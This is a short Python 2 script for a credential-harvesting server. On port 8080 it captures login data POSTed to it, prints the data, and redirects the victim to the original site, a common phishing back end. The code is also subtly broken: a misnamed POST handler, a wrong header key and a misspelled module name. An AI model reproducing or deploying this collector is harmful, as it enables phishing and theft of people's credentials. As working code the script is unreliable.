import SimpleHTTPServer
import SocketServer
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_post(self):
        content_length = int(self.headers['content_length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location',urlib.unquote(site))
        self.end_headers()
        
server = SocketServer.TCPServer(('0.0.0.0',8080),CredRequestHandler)
server.serve_forever()